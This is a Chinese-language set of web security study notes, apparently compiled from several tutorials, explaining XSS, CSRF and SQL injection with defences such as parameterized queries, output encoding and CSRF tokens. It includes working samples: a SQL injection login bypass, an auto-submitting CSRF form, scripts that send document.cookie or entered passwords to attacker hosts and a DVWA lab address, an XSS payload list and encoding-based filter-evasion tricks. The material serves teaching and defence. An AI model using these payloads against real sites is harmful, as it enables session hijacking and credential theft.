XSS和CSRF与网络安全息息相关，这篇文章就来浅析一下这两种攻击方式的原理，以及如何防范这两种攻击。
XSS
XSS，跨站脚本攻击，即Cross Site Scripting，为了和CSS不重名，所以取名为XSS。
原理
XSS攻击者通过畸形的输入，将恶意的js代码插入到了页面中。当其他用户浏览该网页时，恶意的js代码会被执行，从而达到攻击的目的。
XSS攻击发生的根本原因是对用户输入的信任。
案例
XSS类型分为3种，反射型XSS，存储型XSS，DOM-XSS。
反射型XSS
反射型XSS，即将用户的输入直接传到后台（不保存)，后台并未经过任何过滤，直接将输入数据返回给前台。
比如一个页面，其内容就是根据url中查询参数param的值来生成的。那么我们可以请求如下的url：
http://example.com/scene/?param=<script>alert('这是一个XSS攻击')</script>
这样当我们将这个url放出去供其他用户访问时，就会出现alert。因为此时页面内容如下：
<div><script>alert('这是一个XSS攻击')</script></div>
存储型XSS
存储型XSS的攻击过程大致如下：
M用户的畸形输入 -> 后台服务器未经任何处理就存储 -> 其他用户T请求数据 -> M用户的畸形输入返回给T -> 用户T打开页面，XSS代码运行
比如在某个评论区提交了XSS代码，并且这些评论都被存储到服务器中。那么所有打开评论列表页面的用户都会收到XSS代码的攻击。
DOM-XSS
DOM-XSS即纯粹发生在客户端的XSS攻击。
比如某个网页中有个输入框，在输入完成之后，会创建一个a标签，并且将输入值作为a标签的href属性。代码大致如下：
html:
<div class="link"></div>
<input type="text" class="user-input">
<Button class="submit">提交</Button>
js:
var $ = (selector) => document.querySelector(selector);
$('.submit').addEventListener('click', function () {
    $('.link').innerHTML = "<a href='" + $('.user-input').value + "'>点我呀</a>"
});
这样一来，当我输入' onclick=alert('哈哈哈') '，其实就完成了一次简单的XSS攻击（点击a标签就是执行js）。
审查生成的a标签，内容如下：
<a href="" onclick="alert(123)" ''="">点我呀</a>
如何防范XSS?
XSS攻击的原因，就在于没有对用户的输入进行检查、过滤，转义等。因此我们要对用户的输入（url参数/post数据等）当做不可信数据来处理。
这里推荐一个第三方的工具来防范XSS，它具有以下特性：
白名单控制允许的HTML标签以及各标签的属性
通过自定义处理函数，可以对任意标签及其属性进行处理。
CSRF
CSRF，跨站请求伪造，即Cross Site Request Forgery。
原理
CSRF可以在受害者毫不知情的情况下以受害者名义发送请求。其原理是借助受害者的cookie来骗取服务器的信任。
比如，受害者T登录了某个银行网站，sessionId等信息就会保存在浏览器中。这时候，用户T又打开了CSRF攻击网站，这个网站通过表单自动提交来向银行网站发起一次转账请求，这样，受害者T的银行账户的钱可能就被转走了。
这个过程成功的关键点在于：用户登录了银行网站，并且session还未过期的时候，打开了CSRF攻击网站。
案例
这个案例构造了一个CSRF攻击网页，当某个登录了http://www.example.com的用户点开这个网页时，就会自动在www.example.com中发表一个评论，而用户对此毫不知情。
html:
<!--注意：ajax受浏览器同源策略的影响，但是表单提交是不受这个限制的。-->
<form id="attackForm" action="http://www.example.com/article/59a12398904c4928cc46603c/comment/new" method="post">
    <input type="text" name="content" value="vim是世界上最好的编辑器"/>
</form>
js:
// 自动提交表单，这时候，浏览器会带着受害用户在example.com下的cookie去发请求，这样就通过了服务器的认证
window.onload = function () {
   (function () {
       document.querySelector('#attackForm').submit();
   })();
};
如何防范CSRF?
下面列举了两种防御CSRF攻击的措施：
检查HTTP Referer字段
在HTTP的请求头中，有一个Referer字段，用于表示请求来源于哪个地址。上面提到的银行网站，可以在请求到来时，检查Referer字段，如果请求来源地址不在白名单内，就不予回应。
这种方法简单易行，但是也有一定的局限性，比如完全依赖于浏览器发送正确的Referer字段，况且Referer也是很可能被攻击者篡改的。
添加校验TOKEN
其原理是服务器在响应请求时，生成一个csrf-token传递到前台，当前台发起请求时，需要带着这个csrf-token以便于服务器端进行校验。这样一来，由于csrf攻击网站无法获取到这个token，所以也无法通过服务器端的校验。
当前台发起请求时，csrf-token可以通过url参数，或者post的请求体来携带，但是最安全的方式，还是将csrf-token添加到自定义HTTP请求头中（比如X-CSRF-TOKEN）。
CSURF
express团队为我们提供了CSURF这个中间件，可以帮助我们来轻松实现CSRF的防御。




1. SQL注入

　　所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。 攻击者通过在应用程序预先定义好的SQL语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的查询,篡改命令。
　　它能够轻易的绕过防火墙直接访问数据库，甚至能够获得数据库所在的服务器的系统权限。在Web应用漏洞中，SQL Injection 漏洞的风险要高过其他所有的漏洞。

1.1 攻击原理

   假设的登录查询

　　SELECT * FROM  users  WHERE login = 'victor' AND password = '123

　　Sever端代码

　　String sql = "SELECT * FROM users WHERE login = '" + formusr + "' AND password = '" + formpwd + "'";

　　输入字符

　　formusr = ' or 1=1

　　formpwd = anything

　　实际的查询代码

　　SELECT * FROM users WHERE username = ' ' or 1=1  AND password = 'anything'
1.2 发现注入点简单办法

寻找带有查询字符串的url的网页(例如，查询那些在URL里带有"id=" 的URL)。
向这个网站发送一个请求，改变其中的id=语句，带一个额外的单引号（例如：id=123’）。
查看返回的内容，在其中查找“sql”，“statement”等关键字（这也说明返回了具体的错误信息，这本身就很糟糕）。如下图： 
错误消息是否表示发送到SQL服务器的参数没有被正确编码果如此，那么表示可对该网站进行SQL注入攻击。
1.3 如何防范SQL注入攻击

　　一个常见的错误是，假如你使用了存储过程或ORM，你就完全不受SQL注入攻击之害了。这是不正确的，你还是需要确定在给存储过程传递数据时你很谨慎，或在用ORM来定制一个查询时，你的做法是安全的。
　　参数化查询已被视为最有效的可防御SQL注入攻击的防御方式。目前主流的ORM 框架都内置支持并且推荐使用这种方式进行持久层封装。
　　所谓的参数化查询（Parameterized Query 或 Parameterized Statement）是指在设计与数据库链接并访问数据时，在需要填入数值或数据的地方，使用参数 (Parameter) 来给值。

例：      
　　　　SELECT * FROM myTable WHERE myID = @myID

　　　　INSERT INTO myTable (c1, c2, c3, c4) VALUES (@c1, @c2, @c3, @c4)或者INSERT INTO myTable (c1, c2, c3, c4) VALUES(?,?,?,?)
　　通过(?)指定占位符，当然在添加参数的时候，必须按照(c1, c2, c3, c4)的顺序来添加，否则会出错。

2. 跨站脚本攻击(XSS)

XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的.  比如获取用户的Cookie，导航到恶意网站,携带木马等。

2.1 攻击原理

    假如页面有如下一个输入框

　　<input type="text" name="record" value="沙发">

　　【沙发】是来自用户的输入，如果用户输入的是"onfocus="alert(document.cookie)

　　那么就会变成 

　　<input type="text" name="address1" value="" onfocus="alert(document.cookie)">

　　 事件被触发的时候嵌入的JavaScript代码将会被执行

　　 攻击的威力，取决于用户输入了什么样的脚本。
2.2 XSS分类

1. 反射型XSS
反射型XSS，又称非持久型XSS。之所以称为反射型XSS，则是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。而称为非持久型XSS，则是因为这种攻击方式具有一次性。攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。

比如攻击者将如下链接发送给受害者：

http://www.targetserver.com/search.asp?input=<script>alert(document.cookie);</script>
当受害者点击这个链接的时候，注入的脚本被当作搜索的关键词发送到目标服务器的search.asp页面中，则在搜索结果的返回页面中，这段脚本将被当作搜索的关键词而嵌入。这样，当用户得到搜索结果页面后，这段脚本也得到了执行。这就是反射型XSS攻击的原理，可以看到，攻击者巧妙地通过反射型XSS的攻击方式，达到了在受害者的浏览器上执行脚本的目的。由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用，这也是它被称为非持久型XSS的原因

2. 存储型XSS
存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。

2.3 XSS危害

1. 盗取cookie
通过XSS攻击，由于注入代码是在受害者的浏览器上执行，因此能够很方便地窃取到受害者的Cookie信息。比如，我们只要注入类似如下的代码：

<script>location.replace("http://www.attackpage.com/record.asp?secret="+document.cookie)</script>
当受害者的浏览器执行这段脚本的时候，就会自动访问攻击者建立的网站www.attackpage.com，打开其中的recourd.asp，将受害者浏览器的Cookie信息给记录下来。这样，攻击者就得到了用户的Cookie信息。

得到受害者的Cookie信息后，攻击者可以很方便地冒充受害者，从而拥有其在目标服务器上的所有权限，相当于受害者的身份认证被窃取了。

2. 钓鱼攻击
　所谓钓鱼攻击就是构建一个钓鱼页面，诱骗受害者在其中输入一些敏感信息，然后将其发送给攻击者。利用XSS的注入脚本，我们也可以很方便地注入钓鱼页面的代码，从而引导钓鱼攻击。比如下面这样一段代码：

<script>

　　function hack(){ 
　　　　location.replace("http://www.attackpage.com/record.asp?username="+document.forms[0].user.value + "password=" + document.forms[0].pass.value);
　　}

　　</script>
　　<form>
　　<br> <H3>此功能需要登录:</H3 > 
　　<br><br>请输入用户名：<br> 
　　<input type=”text” id=”user”name=”user”>
　　<br>请输入密码：<br>
　　<input type=”password” name =“pass”>
　　<br><input type=”submit”name=”login” value=”登录”onclick=”hack()”>
　　</form>
注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用　户的账号信息。和一般的钓鱼攻击不同，XSS引导的钓鱼攻击由于是对用户信任的网站页面进行修改的。

3. CSRF攻击
比如我们注入如下的HTML代码：

<imgsrc = “http://www.bank.com/transfer.do?toAct=123456&money=10000>
假如上面的代码中所访问的是某个银行网站的转账服务，则当受害者的浏览器运行这段脚本时，就会向攻击者指定的账户（示例的123456）执行转账操作。由于这个转账请求是在受害者的浏览器中运行的，因此浏览器也会自动将受害者的Cookie信息一并发送。这样，发送的请求就好像是受害者自己发送的一样，银行网站也将认可这个请求的合法性，攻击者也就达到了伪造请求的目的。

4. 传播恶意软件
除了直接注入恶意脚本以外，通过XSS攻击，攻击者也可以很方便地在脚本中引入一些恶意软件，比如病毒、木马、蠕虫等等。例如，攻击者可以在某个自己建立的页面上放置一些恶意软件，然后用XSS注入的方式，插入一段引用该页面的脚本。这样当受害者的浏览器执行这段脚本的时候，就会自动访问放置了恶意软件的页面，从而受到这些恶意软件的感染。

2.4 XSS的预防

1. 输入过滤
 对用户的所有输入数据进行检测，比如过滤其中的“<”、“>”、“/”等可能导致脚本注入的特殊字符，或者过滤“script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等。同时，我们也要考虑用户可能绕开ASCII码，使用十六进制编码来输入脚本。因此，对用户输入的十六进制编码，我们也要进行相应的过滤。只要能够严格检测每一处交互点，保证对所有用户可能的输入都进行检测和XSS过滤，就能够有效地阻止XSS攻击

2. 输出编码
通过前面对XSS攻击的分析，我们可以看到，之所以会产生XSS攻击，就是因为Web应用程序将用户的输入直接嵌入到某个页面当中，作为该页面的HTML代码的一部分。因此，当Web应用程序将用户的输入数据输出到目标页面中时，只要用HtmlEncoder等工具先对这些数据进行编码，然后再输出到目标页面中。这样，如果用户输入一些HTML的脚本，也会被当成普通的文字，而不会成为目标页面HTML代码的一部分得到执行。

3. cookie防盗
利用XSS攻击，攻击者可以很方便地窃取到合法用户的Cookie信息。因此，对于Cookie，我们可以采取以下的措施。首先，我们要尽可能地避免在Cookie中泄露隐私，如用户名、密码等；其次，我们可以将Cookie信息利用MD5等Hash算法进行多次散列后存放；再次，为了防止重放攻击，我们也可以将Cookie和IP进行绑定，这样也可以阻止攻击者冒充正常用户的身份。

作为一名普通的网络用户，在XSS攻击的预防上我们可以采取以下措施。首先，我们不要轻易相信电子邮件或者网页中的不明链接，这些链接很有可能引导反射型XSS攻击或者使我们访问到一些不安全的网页。其次，我们在不必要的时候可以禁用脚本功能，这样XSS注入的脚本就无法得到运行。

3. CSRF攻击

CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。

你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......造成的问题包括：个人隐私泄露以及财产安全。

3.1 CSRF漏洞现状

CSRF这种攻击方式在2000年已经被国外的安全人员提出，但在国内，直到06年才开始被关注，08年，国内外的多个大型社区和交互网站分别爆出CSRF漏洞，如：NYTimes.com（纽约时报）、Metafilter（一个大型BLOG网站），YouTube和百度HI......而现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人”。

3.2 原理

网站A ：为恶意网站。
网站B ：用户已登录的网站。
当用户访问 A站 时，A站 私自访问 B站 的操作链接，模拟用户操作。
假设B站有一个删除评论的链接：http://b.com/comment/?type=delete&id=81723
A站 直接访问该链接，就能删除用户在 B站 的评论。

3.3 防御技巧

1. 验证码
几乎所有人都知道验证码，但验证码不单单用来防止注册机的暴力破解，还可以有效防止CSRF的攻击。验证码算是对抗CSRF攻击最简洁有效的方法。但使用验证码的问题在于，不可能在用户的所有操作上都需要输入验证码.只有一些关键的操作，才能要求输入验证码。不过随着HTML5的发展。利用canvas标签，前端也能识别验证码的字符，让CSRF生效。

2. Token
CSRF能攻击成功，根本原因是：操作所带的参数均被攻击者猜测到。既然知道根本原因，我们就对症下药，利用Token。当向服务器传参数时，带上Token。这个Token是一个随机值，并且由服务器和用户同时持有。当用户提交表单时带上Token值，服务器就能验证表单和session中的Token是否一致。

token生成示例代码如下

private static SecureRandom secureRandom=null;
public static String createToken() {
    if(secureRandom==null){
        String entoropy="LogonSessionEntoropy" + System.currentTimeMillis();
        try {
            secureRandom = SecureRandom.getInstance("SHA1PRNG");
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
        secureRandom.setSeed(entoropy.getBytes());
    }
    byte bytes[]=new byte[16];
    secureRandom.nextBytes(bytes);
    byte[] base64Bytes = Base64.encode(bytes);
    return new String(base64Bytes);
}



Security Topic: A7: Cross-Site Scripting(XSS)


BASIC CONCEPTS:
+ Refelect XSS（反射型)
    发出请求的时候，XSS代码出现在URL中，作为输入提交到服务器，服务器响应后在响应内容中出现这段XSS代码，最后交给浏览器解析，这个过程类似反射。
    * 反射性XSS只执行一次，且需要用户触发
+ Persistent(存储型)
    与反射性的差别在于数据不会立马响应给客户端，而是会存储在诸如数据，文件中。等待下次用户查询的时候显示出来。触发攻。
    * 储存性XSS也就比较好理解了，就是持久性的XSS，服务端已经接收了，并且存入数据库，当用户访问这个页面时，这段XSS代码会自己触发，不需要有客户端去手动触发操作。
    储存性XSS多存在于留言板等地方
+ DOM XSS
    最后一种直接不经过服务器，直接在客户端依靠浏览器的解析来进行。例如上面的eval

    简单理解DOM XSS就是出现在javascript代码中的xss漏洞，不需要服务端交互，只发生在客户端传输数据的时候。
<script>  
var temp = document.URL;//获取URL  
var index = document.URL.indexOf("content=")+4;  
var par = temp.substring(index);  
document.write(decodeURI(par));//输入获取内容  
</script>  
如果输入 http://www.baidu.com/dom.html?content=<script>alert(/xss/)</script>，就会产生XSS漏洞。
这种利用也需要受害者点击链接来触发，DOM型XSS是前端代码中存在了漏洞，而反射型是后端代码中存在了漏洞。
反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，在dom xss中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。(引用百度）


跨站脚本的跨，体现了浏览器的特性，可以跨域。所以也就给远程代码或者第三方域上的代码提供了通道。
一般弹窗攻击是无意义的。所以一般都会以脚本的形式嵌入页面。
<script src="http://www.xxx.com/xss.js"></script>
多发于有输入的页面，类似表单等。

eval扮演的角色
有时候eval在其中也扮演了重要角色，因为它能解释执行js代码，类似一个小型的解释器。
<script>eval('console.log(document.cookie)')</script>


XSS攻击的危害包括
盗取各类用户帐号权限(控制所盗窃权限数据内容)，如机器登录帐号、用户网银帐号、各类管理员帐号
控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
基于XSS的跨站业务请求(如：非法转账、非法下单、非法转载/发表内容、发送电子邮件、利用管理员身份提权挂马、控制受害者机器向其它网站发起攻击等)
形成持久化APT攻击，长期控制网站业务中枢
利用跨站业务形成蠕虫病毒式传播
劫持网站，劫持后可用于钓鱼、伪装、跳转、挂广告等，属挂马类型


XSS跨站脚本，是一种Web安全漏洞，有趣是是他并不像SQL注入等攻击手段攻击服务端，本身对Web服务器没有危害，攻击的对象是客户端，使用浏览器访问这些恶意地址的网民



A7: USER INPUT
+ The URL
+ HTTP referrer objects
+ GET parameters from a form
+ POST parameters from a form
+ Window.location
+ Document.referrer
+ document.location
+ document.URL
+ document.URLUnencoded
+ cookie data
+ headers data
+ database data
 

A7: EXAMPLE
+ (String) page += “<input name=‘somefield’ type=‘TEXT’ value=‘” + reques.getParameter(“inputfield”) + “’>”;
+ ‘><script>document.location=‘http://www.attacker.com/cgi- bin/cookie.cgi?foo=‘+document.cookie</script>’
 
A7: COMMON SOLUTION
+ Use safe framework
+ Escaping untrusted HTTP request data
+ https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet
 


1. 标准的xss漏洞测试代码
<script>alert('xss')</script>
2. img图片标记属性跨站攻击代码
<img src="javascript:alert(/xss/)"></img>
<img dynsrc="javascript:alert('xss')">
3. 无需"<>"，利用html标记事件属性跨站
<img src="" onerror=alert("xss")>
4. 空格与回车符转换
<img src="Jav&#x09;ascript:alert('xss')">
<img src="Jav&#x0A;ascript:alert('xss')">
<img src="Jav&#x0D;ascript:alert('xss')">



XSS危害
1. 页面重定向
<script>window.location='http://gitbook.cn/'</script>
http:192.168.0.9/dvwa/vulnerablilities/xss_r/?name=<script>window.location='http://gitbook.cn/'</script>
http:192.168.0.9/dvwa/vulnerablilities/xss_r/?name=<scRipt>window.location='http://gitbook.cn/'</scRipt>
http:192.168.0.9/dvwa/vulnerablilities/xss_r/?name=<img src='xss' onerror='alert("hey!")'>
http:192.168.0.9/dvwa/vulnerablilities/xss_r/?name=<script>eval(\u0061\u006c\u0065\u0072\u0074(1))</script>




2. cookie获取
http://192.168.0.9/dvwa/vulnerabilities/xss_r/?name=<script>new Image().src="http://192.168.0.8/xss.php?output="+document.cookie;</script>


## 浅谈XSS—字符编码和浏览器解析原理
resource:
[浅谈XSS—字符编码和浏览器解析原理](https://security.yirendai.com/news/share/26)
浏览器在解析HTML文档时无论按照什么顺序，主要有三个过程：HTML解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解析工作
首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析

基本概念
HTML字符实体：

在呈现HTML页面时，针对某些特殊字符如“<”或”>”直接使用，浏览器会误以为它们标签的开始或结束，若想正确的在HTML页面呈现特殊字符就需要用到其对应的字符实体。

字符实体是一个预先定义好的转义序列，它定义了一些无法在文本内容中输入的字符或符号。字符实体以&开头+预先定义的实体名称，以分号结束，如“<”的实体名称为&lt; 或以&开头+#符号以及字符的十进制数字，如”<”的实体编号为&#60;，字符都是有实体编号的但有些字符没有实体名称。

JavaScript编码：最常用的如“\uXXXX”这种写法为Unicode转义序列，表示一个字符，其中xxxx表示一个16进制数字，如”<” Unicode编码为“\u003c”。

URL编码：%加字符的ASCII编码对于的2位16进制数字，如”/”对应的URL编码为%2f。


深入理解
下面我们结合具体示例来讨论下浏览器的解析原理过程和XSS复合编码的一些内容：

      <a href="javascript:alert(1)">test</a>
针对上述a标签我们分析一下该环境中浏览器的解析顺序，首先HTML解析器开始工作，并对href中的字符做HTML解码，接下来URL解析器对href值进行解码，正常情况下URL值为一个正常的URL链接，如：“https://www.yirendai.com“，那么URL解析器工作完成后是不需要其他解码的，但是该环境中URL资源类型为JavaScript，因此该环境中最后一步JavaScript解析器还会进行解码操作，最后解析的脚本被执行。

整个解析顺序为3个环节：HTML解码àURL解码àJS解码

我们对href值做一些编码的转换，对照刚才分析的解析过程，思考一下脚本是否会正常执行？

Test1：URL 编码 "javascript:alert(1)”
URL编码“javascript:alert(1)”=“%6A%61%76%61%73%63%72%69%70%74:%61%6C%65%72%74%28%31%29”
编码后是： <a href="%6A%61%76%61%73%63%72%69%70%74:%61%6C%65%72%74%28%31%29">test1</a>
分析：许多童鞋把Test1放到HTML里发现脚本并没有正常执行，就会想按照刚才分析的，URL解码之后Javascript解析器完成解码操作，脚本应该会正常执行啊，这里就有一个URL解析过程中的一个细节了，不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就导致Test1中被编码的“javascript”没有解码，当然不会被URL解析器识别了


Test2：HTML字符实体编码 "javascript" 、URL 编码 "alert(2)"
HTML编码"javascript"="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;"
URL编码"alert(2)"=” %61%6C%65%72%74%28%32%29”
编码后是： <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:%61%6C%65%72%74%28%32%29">test2</a>
分析： 那Test2也是对javascript编码了为什么可以执行呢？因为"javascript"是做的HTML实体编码，HTML解析器工作时，href里的HTML实体会被解码，接下来URL解析器工作解析href属性里的链接时，"javascript"协议在第一步被HTML解码了，这样URL解析器是可以识别的，然后继续解析后面的”%61%6C%65%72%74%28%32%29”，最后JavaScript解析器完成解析操作，脚本执行。


Test3：对<a href="javascript:alert(3)">test3</a>做JS编码àURL编码àHTML编码共3层
JS编码：<a href="javascript:\u0061\u006c\u0065\u0072\u0074(3)">test3</a>
URL编码：<a href="javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)">test3</a>
HTML编码：<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#54;&#37;&#51;&#49;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#54;&#37;&#54;&#51;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#54;&#37;&#51;&#53;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#55;&#37;&#51;&#50;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#55;&#37;&#51;&#52;&#40;&#51;&#41;">test3</a>


恶意脚本的后果
这种在其他用户的浏览器中执行任意脚本的权限，赋予了攻击者有能力发动以下几类攻击

Cookie窃取：攻击者能够通过document.cookie访问受害者与网站关联的cookie，然后传送到攻击者自己的服务器，接着从这些cookie中提取敏感信息，如Session ID。
记录用户行为（Keylogging）：攻击者可以使用 addEventListener方法注册用于监听键盘事件的回调函数，并且把所有用户的敲击行为发送到他自己的服务器，这些敲击行为可能记录着用户的敏感信息，比如密码和信用卡号码。
钓鱼网站（Phishing）：攻击者可以通过修改DOM在页面上插入一个假的登陆框，也可以把表单的action属性指向他自己的服务器地址，然后欺骗用户提交自己的敏感信息。


## Resource
[详解XSS 场景](http://qingbob.com/Excess-XSS/)
[https://forum.bugcrowd.com/t/tutorial-injectx-to-find-xss/790](Tutorial: InjectX to Find XSS)
[Using Burp Scanner to Test for DOM-Based XSS](https://support.portswigger.net/customer/portal/articles/2325926-using-burp-scanner-to-test-for-dom-based-xss)